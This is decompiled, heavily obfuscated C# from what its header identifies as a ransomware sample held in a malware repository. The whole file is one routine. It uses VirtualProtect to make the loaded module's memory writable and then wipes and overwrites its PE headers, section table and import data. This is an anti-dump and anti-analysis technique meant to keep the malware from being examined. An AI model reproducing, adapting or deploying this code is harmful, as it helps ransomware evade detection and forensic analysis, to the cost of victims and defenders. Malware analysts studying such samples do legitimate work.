// Decompiled with JetBrains decompiler
// Type: 텕භṟ៝笴Ჟ
// Assembly: mtrl, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D340C4D9-77FF-49DB-A007-50B4002F5AFA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.Win32.Generic-429a36b53420915e57e9034d24b9ce0668b08c5e0e1d3eca43c67980b9dd2198.exe

using System;
using System.Runtime.InteropServices;

internal static class 텕භṟ៝笴\uE676\u1C9F\uE2C7
{
  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  private static extern unsafe bool \uE226\u222E붜\u2BE6嬆鏛纼ꤷ(
    byte* lpAddress,
    int dwSize,
    uint flNewProtect,
    out uint lpflOldProtect);

  public static unsafe void ዳ뷅\uE09C䘦\uF128迡ﰍꮞ()
  {
    byte* hinstance = (byte*) (void*) Marshal.GetHINSTANCE(typeof (텕භṟ៝笴\uE676\u1C9F\uE2C7).Module);
    int num1 = 8 - (-51 - --9 - ~6);
    while (true)
    {
      int num2;
      int num3;
      do
      {
        byte* lpAddress1;
        byte* lpAddress2;
        uint lpflOldProtect;
        uint[] numArray1;
        uint[] numArray2;
        ushort length;
        uint num4;
        byte* numPtr1;
        uint num5;
        uint num6;
        int index1;
        byte* numPtr2;
        uint[] numArray3;
        byte* lpAddress3;
        byte* lpAddress4;
        byte* numPtr3;
        int index2;
        ushort num7;
        int num8;
        int num9;
        do
        {
          byte* numPtr4;
          int num10;
          int num11;
          do
          {
            int num12;
            int num13;
            do
            {
              int index3;
              uint num14;
              int num15;
              ushort num16;
              int num17;
              int num18;
              do
              {
                int num19;
                int num20;
                do
                {
                  int index4;
                  byte* lpAddress5;
                  int num21;
                  do
                  {
                    uint num22;
                    int index5;
                    byte* numPtr5;
                    int index6;
                    int index7;
                    ushort num23;
                    int num24;
                    do
                    {
                      int num25;
                      int num26;
                      do
                      {
                        switch (num1)
                        {
                          case 1:
                            텕භṟ៝笴\uE676\u1C9F\uE2C7.\uE226\u222E붜\u2BE6嬆鏛纼ꤷ(lpAddress2, 4, 64U, out lpflOldProtect);
                            *(int*) lpAddress2 = 0;
                            num1 = --99 - 2;
                            continue;
                          case 2:
                            num22 = num22 - numArray1[index5] + numArray2[index5];
                            goto label_7;
                          case 3:
                            ++index3;
                            num1 = --96 - (9 + 8) + 3;
                            continue;
                          case 4:
                          case 14:
                            if (index7 >= (int) length)
                            {
                              num1 = ~-(27 - (5 + 2 - ~9));
                              continue;
                            }
                            goto label_25;
                          case 5:
                            ++index7;
                            num1 = ~~(8 - ~~4);
                            continue;
                          case 6:
                            num23 = (ushort) *lpAddress2;
                            num1 = -(-82 - (8 - 5));
                            continue;
                          case 7:
                            numPtr1 = hinstance + (int) *(uint*) numPtr1 + 6;
                            num1 = --42 - (3 + 5) - 9;
                            continue;
                          case 8:
                            num25 = (int) numArray1[index3];
                            num26 = (int) num14;
                            num1 = ~(~8 - (-19 - (~6 + ~6)));
                            continue;
                          case 9:
                            goto label_18;
                          case 10:
                            goto label_129;
                          case 11:
                            goto label_22;
                          case 12:
                            goto label_23;
                          case 13:
                          case 63:
                            goto label_90;
                          case 15:
                            goto label_26;
                          case 16:
                            goto label_29;
                          case 17:
                            goto label_30;
                          case 18:
                            goto label_32;
                          case 19:
                            goto label_33;
                          case 20:
                            goto label_34;
                          case 21:
                            goto label_36;
                          case 22:
                            goto label_38;
                          case 23:
                            goto label_39;
                          case 24:
                            goto label_40;
                          case 25:
                            goto label_43;
                          case 26:
                            goto label_44;
                          case 27:
                            goto label_46;
                          case 28:
                            goto label_47;
                          case 29:
                          case 30:
                            goto label_61;
                          case 31:
                            goto label_50;
                          case 32:
                            goto label_51;
                          case 33:
                            goto label_52;
                          case 34:
                            goto label_154;
                          case 35:
                            goto label_54;
                          case 36:
                          case 86:
                            goto label_55;
                          case 37:
                            goto label_56;
                          case 38:
                            goto label_57;
                          case 39:
                            goto label_58;
                          case 40:
                            goto label_59;
                          case 41:
                            goto label_62;
                          case 42:
                            goto label_63;
                          case 43:
                            goto label_64;
                          case 44:
                            goto label_65;
                          case 45:
                            goto label_67;
                          case 46:
                            goto label_68;
                          case 47:
                            goto label_69;
                          case 48:
                            goto label_70;
                          case 49:
                            goto label_71;
                          case 50:
                          case 87:
                            goto label_123;
                          case 51:
                            if (num4 >= numArray1[index6] + numArray3[index6])
                              goto label_120;
                            else
                              goto label_74;
                          case 52:
                            goto label_75;
                          case 53:
                            goto label_76;
                          case 54:
                            goto label_77;
                          case 55:
                            if (num22 >= numArray1[index5] + numArray3[index5])
                              break;
                            goto label_80;
                          case 56:
                            goto label_81;
                          case 57:
                            goto label_84;
                          case 58:
                            goto label_85;
                          case 59:
                            goto label_86;
                          case 60:
                            goto label_87;
                          case 61:
                            goto label_88;
                          case 62:
                            goto label_89;
                          case 64:
                          case 105:
                            goto label_150;
                          case 65:
                            goto label_93;
                          case 66:
                            goto label_95;
                          case 67:
                            goto label_97;
                          case 68:
                            goto label_100;
                          case 69:
                            goto label_101;
                          case 70:
                            goto label_102;
                          case 71:
                            goto label_103;
                          case 72:
                            goto label_104;
                          case 73:
                            goto label_105;
                          case 74:
                            goto label_106;
                          case 75:
                            goto label_107;
                          case 76:
                            goto label_108;
                          case 77:
                            goto label_110;
                          case 78:
                            goto label_111;
                          case 79:
                            goto label_112;
                          case 80:
                            goto label_113;
                          case 81:
                            goto label_114;
                          case 82:
                            goto label_115;
                          case 83:
                            goto label_117;
                          case 84:
                            goto label_118;
                          case 85:
                            goto label_119;
                          case 88:
                            goto label_125;
                          case 89:
                            goto label_126;
                          case 90:
                            goto label_128;
                          case 91:
label_6:
                            if (index5 < (int) length)
                            {
                              if (numArray1[index5] >= num22)
                                break;
                              goto label_131;
                            }
                            else
                              goto label_7;
                          case 92:
                            goto label_132;
                          case 93:
                            goto label_134;
                          case 94:
                            goto label_136;
                          case 95:
                            goto label_138;
                          case 96:
                            goto label_139;
                          case 97:
                            goto label_140;
                          case 98:
                            goto label_141;
                          case 99:
                            goto label_142;
                          case 100:
                            goto label_143;
                          case 101:
                            goto label_144;
                          case 102:
                            goto label_146;
                          case 103:
                            goto label_147;
                          case 104:
                            goto label_149;
                          case 106:
                            goto label_152;
                          case 107:
                            goto label_153;
                          case 108:
                            goto label_155;
                          case 109:
                            goto label_156;
                          case 110:
                            goto label_157;
                          case 111:
                            goto label_158;
                          case 112:
                            goto label_159;
                          default:
                            *lpAddress1 = (byte) 0;
                            ++lpAddress1;
                            num1 = --96 - 2;
                            continue;
                        }
                        ++index5;
                        goto label_6;
label_7:
                        num4 = *(uint*) numPtr5 + 2U;
                        index6 = 0;
                        goto label_121;
label_120:
                        ++index6;
label_121:
                        if (index6 < (int) length)
                        {
                          if (numArray1[index6] < num4)
                            num1 = -(~42 - (2 + 6));
                          else
                            goto label_120;
                        }
                        else
                          goto label_122;
                      }
                      while ((uint) num25 >= (uint) num26);
                      num1 = ~-93 - 3;
                      continue;
label_18:
                      num24 = (int) num5;
                      num1 = ----15;
                    }
                    while (num24 == 0);
                    goto label_19;
label_129:
                    return;
label_19:
                    num1 = ~-(61 - (-9 - (9 + 5)));
                    continue;
label_22:
                    numPtr5 = hinstance + (int) num14;
                    byte* numPtr6;
                    num22 = *(uint*) (numPtr6 + 12);
                    num1 = -~(40 + (3 - 6 + ~2));
                    continue;
label_23:
                    index1 = 0;
                    goto label_82;
label_25:
                    텕භṟ៝笴\uE676\u1C9F\uE2C7.\uE226\u222E붜\u2BE6嬆鏛纼ꤷ(numPtr1, 8, 64U, out lpflOldProtect);
                    Marshal.Copy(new byte[8], 0, (IntPtr) (void*) numPtr1, 8);
                    num1 = ~(8 - (41 + ~-6));
                    continue;
label_26:
                    int index8 = 0;
                    goto label_153;
label_29:
                    *(int*) lpAddress3 = 0;
                    *(int*) (lpAddress3 + 4) = 0;
                    *(int*) (lpAddress3 + 8) = 0;
                    num1 = ~~--48;
                    continue;
label_30:
                    int num27 = (int) numArray1[index4];
                    uint num28;
                    int num29 = (int) num28;
                    num1 = -(-58 - 3) - 3;
                    if ((uint) num27 < (uint) num29)
                    {
                      num1 = ~-~-28;
                      continue;
                    }
                    continue;
label_32:
                    int index9 = 0;
                    num1 = ~(-2 - --12);
                    continue;
label_33:
                    numPtr6 = hinstance + (int) num5;
                    num14 = *(uint*) numPtr6;
                    index3 = 0;
                    num1 = ~~~-83;
                    continue;
label_34:
                    if (num19 >= (int) length)
                    {
                      텕භṟ៝笴\uE676\u1C9F\uE2C7.\uE226\u222E붜\u2BE6嬆鏛纼ꤷ(lpAddress4, 72, 64U, out lpflOldProtect);
                      num1 = --107 + ~4;
                      continue;
                    }
                    goto label_156;
label_36:
                    int num30 = num15;
                    int num31 = (int) num23;
                    num1 = -(8 - 4) - -66;
                    if (num30 >= num31)
                    {
                      num1 = --5 - ~9 - 5;
                      continue;
                    }
                    continue;
label_38:
                    int num32 = 0;
                    goto label_60;
label_39:
                    byte* lpAddress6;
                    텕භṟ៝笴\uE676\u1C9F\uE2C7.\uE226\u222E붜\u2BE6嬆鏛纼ꤷ(lpAddress6, 11, 64U, out lpflOldProtect);
                    int index10 = 0;
                    goto label_41;
label_40:
                    ++index10;
label_41:
                    int num33 = index10;
                    num1 = --51 + ~4 + 7;
                    if (num33 >= 11)
                    {
                      num1 = 70 + ~~4;
                      continue;
                    }
                    continue;
label_43:
                    length = *(ushort*) numPtr1;
                    num1 = ~(2 - 108) - 7;
                    continue;
label_44:
                    if (num28 < numArray1[index4] + numArray3[index4])
                    {
                      num28 = num28 - numArray1[index4] + numArray2[index4];
                      num1 = -(-3 - (~2 + (3 + 7))) + 6;
                      continue;
                    }
                    goto label_85;
label_46:
                    ++index9;
                    num1 = 8 - (4 - 8 - ~-52);
                    continue;
label_47:
                    *lpAddress1 = (byte) 0;
                    ++lpAddress1;
                    if (*lpAddress1 == (byte) 0)
                    {
                      lpAddress1 += 2;
                      num1 = -~72 - 4;
                      continue;
                    }
                    goto label_87;
label_50:
                    num28 = *(uint*) (lpAddress3 + 8);
                    index4 = 0;
                    num1 = ~---43;
                    continue;
label_51:
                    lpAddress1 += 4;
                    num1 = --118 - 8;
                    continue;
label_52:
                    *(int*) (lpAddress4 + 8) = 0;
                    *(int*) (lpAddress4 + 12) = 0;
                    num1 = -~~-1;
                    continue;
label_54:
                    index5 = 0;
                    num1 = ~(-95 + 3);
                    continue;
label_55:
                    텕භṟ៝笴\uE676\u1C9F\uE2C7.\uE226\u222E붜\u2BE6嬆鏛纼ꤷ(hinstance + (int) num22, 11, 64U, out lpflOldProtect);
                    num1 = ~(4 - (3 + 9 - -5)) + 6;
                    continue;
label_56:
                    numArray1[index7] = *(uint*) (numPtr1 + 12);
                    numArray3[index7] = *(uint*) (numPtr1 + 8);
                    num1 = ~-54 - (6 - 3) + 2;
                    continue;
label_57:
                    index7 = 0;
                    num1 = -~(13 + (~6 - -7));
                    continue;
label_58:
                    *(int*) numPtr2 = 1818522734;
                    num1 = 5 - (7 - --49);
                    continue;
label_59:
                    ++num32;
label_60:
                    if (num32 < 8)
                      goto label_128;
label_61:
                    ++num15;
                    num1 = ~(-2 + 5 - 30) - 5;
                    continue;
label_62:
                    ++lpAddress1;
                    num1 = 3 - (~5 - (35 + ~-7));
                    continue;
label_63:
                    num1 = ~~46 - 2;
                    continue;
label_64:
                    num4 = num4 - numArray1[index6] + numArray2[index6];
                    num1 = ~(-97 - ~9);
                    continue;
label_65:
                    int num34 = index4;
                    int num35 = (int) length;
                    num1 = -~~-17;
                    if (num34 >= num35)
                    {
                      num1 = --~-17;
                      continue;
                    }
                    continue;
label_67:
                    numPtr1 += 40;
                    ++num19;
                    num1 = ~~~-21;
                    continue;
label_68:
                    ++lpAddress2;
                    num1 = 9 - -(57 - (5 + -4));
                    continue;
label_69:
                    *(int*) (numPtr2 + 4) = 1818504812;
                    num1 = ~~(105 + -(6 - 7));
                    continue;
label_70:
                    *(int*) (lpAddress3 + 12) = 0;
                    lpAddress1 = hinstance + (int) num28;
                    num1 = -~(5 - -3 - -63);
                    continue;
label_71:
                    numArray3 = new uint[(int) length];
                    numArray2 = new uint[(int) length];
                    num1 = -~~-38;
                    continue;
label_74:
                    num1 = 9 - -(~5 - 2 - -42);
                    continue;
label_75:
                    numArray2[index7] = *(uint*) (numPtr1 + 20);
                    numPtr1 += 40;
                    num1 = ~-19 - (9 + 4);
                    continue;
label_76:
                    lpAddress6[index10] = numPtr3[index10];
                    num1 = ~~27 - 3;
                    continue;
label_77:
                    if (*(uint*) (numPtr1 - 120) != 0U)
                    {
                      byte* numPtr7 = hinstance + (int) *(uint*) (numPtr1 - 120);
                      byte* numPtr8 = hinstance + (int) *(uint*) numPtr7;
                      lpAddress5 = hinstance + (int) *(uint*) (numPtr7 + 12);
                      lpAddress6 = hinstance + (int) *(uint*) numPtr8 + 2;
                      num1 = 119 + ~-3 + -3 - 7;
                      continue;
                    }
                    goto label_106;
label_80:
                    num1 = -(-(8 - 3) - 6) - 9;
                    continue;
label_81:
                    ++index1;
label_82:
                    num21 = index1;
                    num1 = -(-4 - ~3 - 101) - 2;
                    continue;
label_90:
                    if (index9 < 11)
                    {
                      (hinstance + (int) num22)[index9] = numPtr2[index9];
                      num1 = -~--26;
                      continue;
                    }
                    goto label_91;
label_93:
                    if (*lpAddress2 == (byte) 0)
                    {
                      lpAddress2 += 3;
                      goto label_61;
                    }
                    else
                      goto label_108;
label_95:
                    if (*lpAddress1 != (byte) 0)
                    {
                      *lpAddress1 = (byte) 0;
                      num1 = ~-(102 + ~(6 - 6));
                      continue;
                    }
                    goto label_96;
label_108:
                    *lpAddress2 = (byte) 0;
                    ++lpAddress2;
                    if (*lpAddress2 == (byte) 0)
                      goto label_109;
label_134:
                    *lpAddress2 = (byte) 0;
                    numPtr4 = lpAddress2 + 1;
                    if (*numPtr4 != (byte) 0)
                    {
                      *numPtr4 = (byte) 0;
                      lpAddress2 = numPtr4 + 1;
                      num1 = -(2 + 4 + (5 - 3) - 50 - (2 - 4));
                      continue;
                    }
                    goto label_135;
label_144:
                    *(int*) (numPtr3 + 4) = 1852404846;
                    *(short*) (numPtr3 + 8) = (short) 25973;
                    numPtr3[10] = (byte) 0;
                    if (!(typeof (텕භṟ៝笴\uE676\u1C9F\uE2C7).Module.FullyQualifiedName != "<Unknown>"))
                    {
                      num6 = *(uint*) (numPtr1 - 16);
                      num5 = *(uint*) (numPtr1 - 120);
                      num1 = -(-115 - (7 - 3 - (4 + 7)) + 4);
                      continue;
                    }
                    goto label_145;
label_153:
                    if (index8 < (int) length)
                    {
                      if (numArray1[index8] < num6 && num6 < numArray1[index8] + numArray3[index8])
                      {
                        num6 = num6 - numArray1[index8] + numArray2[index8];
                        num1 = ~-(46 + -(3 + 8));
                      }
                      else
                      {
                        ++index8;
                        num1 = -~--106;
                      }
                    }
                    else
                      goto label_154;
                  }
                  while (num21 < 11);
                  num1 = -(-7 - (9 - 7 - ~8) - -3);
                  continue;
label_84:
                  num1 = ~~--20;
                  continue;
label_85:
                  ++index4;
                  num1 = -(-(6 - 4) - 45 - ~2);
                  continue;
label_86:
                  num1 = 80 - (2 - 9);
                  continue;
label_87:
                  *lpAddress1 = (byte) 0;
                  ++lpAddress1;
                  num1 = -(4 - (7 + 3) - 61 - (8 - 9));
                  continue;
label_88:
                  numPtr1 = hinstance + 60;
                  num1 = 2 - -(-2 - -(2 + 5));
                  continue;
label_89:
                  텕භṟ៝笴\uE676\u1C9F\uE2C7.\uE226\u222E붜\u2BE6嬆鏛纼ꤷ(lpAddress2, 8, 64U, out lpflOldProtect);
                  num1 = -(~63 - (8 - 4));
                  continue;
label_91:
                  num1 = ~---74;
                  continue;
label_96:
                  num1 = --45 - (6 + 5) + 7;
                  continue;
label_97:
                  int index11;
                  lpAddress5[index11] = numPtr2[index11];
                  ++index11;
label_98:
                  num20 = index11;
                  num1 = -~(70 - ~~4);
                  continue;
label_150:
                  if (num8 < 8)
                  {
                    텕භṟ៝笴\uE676\u1C9F\uE2C7.\uE226\u222E붜\u2BE6嬆鏛纼ꤷ(lpAddress1, 4, 64U, out lpflOldProtect);
                    num1 = ~-10 - 9;
                    continue;
                  }
                  goto label_151;
label_158:
                  텕භṟ៝笴\uE676\u1C9F\uE2C7.\uE226\u222E붜\u2BE6嬆鏛纼ꤷ(lpAddress5, 11, 64U, out lpflOldProtect);
                  index11 = 0;
                  goto label_98;
                }
                while (num20 < 11);
                num1 = 2 - -21;
                continue;
label_100:
                *(int*) lpAddress2 = 0;
                byte* numPtr9 = lpAddress2 + 4;
                *(int*) numPtr9 = 0;
                lpAddress2 = numPtr9 + 4;
                num1 = ~-29 - 6;
                continue;
label_101:
                num1 = ~-91 - 3;
                continue;
label_102:
                *(int*) (lpAddress4 + 4) = 0;
                num1 = -~--32;
                continue;
label_103:
                num14 = num14 - numArray1[index3] + numArray2[index3];
                num1 = 7 - -~-5;
                continue;
label_104:
                텕භṟ៝笴\uE676\u1C9F\uE2C7.\uE226\u222E붜\u2BE6嬆鏛纼ꤷ(lpAddress1, 4, 64U, out lpflOldProtect);
                *(int*) lpAddress1 = 0;
                lpAddress1 += 12;
                num1 = -(-92 - -(5 + 9)) + 3;
                continue;
label_105:
                텕භṟ៝笴\uE676\u1C9F\uE2C7.\uE226\u222E붜\u2BE6嬆鏛纼ꤷ(hinstance + (int) num4, 11, 64U, out lpflOldProtect);
                num1 = 6 - ~~-6;
                continue;
label_106:
                num19 = 0;
                num1 = ~(-65 - ~-4 - ~9);
                continue;
label_107:
                *(int*) numPtr3 = 1866691662;
                num1 = ~---102;
                continue;
label_109:
                lpAddress2 += 2;
                num1 = --(24 + -(3 - 8));
                continue;
label_110:
                lpAddress1 = (byte*) ((ulong) ((uint) lpAddress1 + 7U) & 18446744073709551612UL) + 2;
                num16 = (ushort) *lpAddress1;
                num1 = 105 - --2;
                continue;
label_111:
                numPtr2[10] = (byte) 0;
                numPtr3 = stackalloc byte[11];
                num1 = ~~83 - 8;
                continue;
label_112:
                lpAddress4 = hinstance + (int) *(uint*) (numPtr1 - 16);
                num1 = --63 - 9;
                continue;
label_113:
                lpAddress1 += 3;
                num1 = ~~64 - 5;
                continue;
label_114:
                lpAddress1 += (int) *(uint*) lpAddress1;
                num1 = ~~~-78;
                continue;
label_115:
                num17 = index3;
                num18 = (int) length;
                num1 = -(~16 - -9);
              }
              while (num17 < num18);
              num1 = 16 - ~~5;
              continue;
label_117:
              index2 = 0;
              num1 = --96 - 4;
              continue;
label_118:
              *(int*) lpAddress1 = 0;
              num1 = --25 - ~6;
              continue;
label_119:
              lpAddress2 += 2;
              num15 = 0;
              num1 = ~(-(5 + 3) - 21 - ~6);
              continue;
label_122:
              num1 = -~--35;
              continue;
label_123:
              int num36;
              ++num36;
label_124:
              if (num36 >= (int) num16)
                return;
              goto label_148;
label_125:
              numPtr1 = numPtr1 + 4 + (int) num7;
              numPtr2 = stackalloc byte[11];
              num1 = ~-~-41;
              continue;
label_126:
              num12 = (int) num14;
              num13 = (int) numArray1[index3] + (int) numArray3[index3];
              num1 = -~~-3;
              continue;
label_147:
              lpAddress1 += 2;
              num36 = 0;
              goto label_124;
            }
            while ((uint) num12 >= (uint) num13);
            num1 = ~-85 - 9 - 4;
            continue;
label_128:
            텕භṟ៝笴\uE676\u1C9F\uE2C7.\uE226\u222E붜\u2BE6嬆鏛纼ꤷ(lpAddress2, 4, 64U, out lpflOldProtect);
            *lpAddress2 = (byte) 0;
            num1 = 8 - -(25 - ~(3 + 9));
            continue;
label_131:
            num1 = ~(-3 - (65 + (-7 + ~4)));
            continue;
label_132:
            num10 = index2;
            num11 = (int) length;
            num1 = -~(119 + (-5 - 3));
          }
          while (num10 < num11);
          num1 = 3 - (~4 - (2 - -9));
          continue;
label_135:
          lpAddress2 = numPtr4 + 1;
          num1 = ----30;
          continue;
label_136:
          num9 = (int) *lpAddress1;
          num1 = ~~(30 - 2);
        }
        while (num9 != 0);
        num1 = ~(-85 - ~~3) - 7;
        continue;
label_138:
        ++index2;
        num1 = --(101 - (8 + 2 - (3 - 2)));
        continue;
label_139:
        Marshal.Copy(new byte[8], 0, (IntPtr) (void*) numPtr1, 8);
        num1 = 6 - ~(-4 - (9 + 5) - -56);
        continue;
label_140:
        byte* numPtr10 = lpAddress2 + 12;
        lpAddress2 = (byte*) ((ulong) ((uint) (numPtr10 + (int) *(uint*) numPtr10) + 7U) & 18446744073709551612UL) + 2;
        num1 = ~(~4 - (9 - 7));
        continue;
label_141:
        numPtr1 += 14;
        num7 = *(ushort*) numPtr1;
        num1 = 104 - (2 + 6 - ~7);
        continue;
label_142:
        (hinstance + (int) num4)[index1] = numPtr3[index1];
        num1 = ~(-57 - ~-3 - -2);
        continue;
label_143:
        ++lpAddress1;
        ++num8;
        num1 = 91 - (~8 + -5) - (9 - 9);
        continue;
label_145:
        num1 = --(70 + ~~9);
        continue;
label_146:
        lpAddress2 = hinstance + (int) *(uint*) (lpAddress4 + 8);
        *(int*) lpAddress4 = 0;
        num1 = 6 - ~--63;
        continue;
label_148:
        텕භṟ៝笴\uE676\u1C9F\uE2C7.\uE226\u222E붜\u2BE6嬆鏛纼ꤷ(lpAddress1, 8, 64U, out lpflOldProtect);
        num1 = 7 - (6 - 9) - -69 - ~4;
        continue;
label_149:
        numArray1 = new uint[(int) length];
        num1 = --42 - -7;
        continue;
label_151:
        num1 = ~-~-89;
        continue;
label_152:
        *(short*) (numPtr2 + 8) = (short) 108;
        num1 = ~~~-79;
        continue;
label_154:
        lpAddress3 = hinstance + (int) num6;
        텕භṟ៝笴\uE676\u1C9F\uE2C7.\uE226\u222E붜\u2BE6嬆鏛纼ꤷ(lpAddress3, 72, 64U, out lpflOldProtect);
        num1 = --43 - (7 + 5);
        continue;
label_155:
        num5 = num5 - numArray1[index2] + numArray2[index2];
        num1 = -~9 + 9;
        continue;
label_156:
        텕භṟ៝笴\uE676\u1C9F\uE2C7.\uE226\u222E붜\u2BE6嬆鏛纼ꤷ(numPtr1, 8, 64U, out lpflOldProtect);
        num1 = -(~91 + -4);
        continue;
label_157:
        *(int*) lpAddress1 = 0;
        lpAddress1 += 4;
        num8 = 0;
        num1 = ~~--64;
        continue;
label_159:
        if (numArray1[index2] < num5)
        {
          num2 = (int) num5;
          num3 = (int) numArray1[index2] + (int) numArray3[index2];
          num1 = 6 - -(92 - ~~3);
        }
        else
          goto label_138;
      }
      while ((uint) num2 >= (uint) num3);
      num1 = 113 - (6 + 2 - (8 - 5));
    }
  }
}
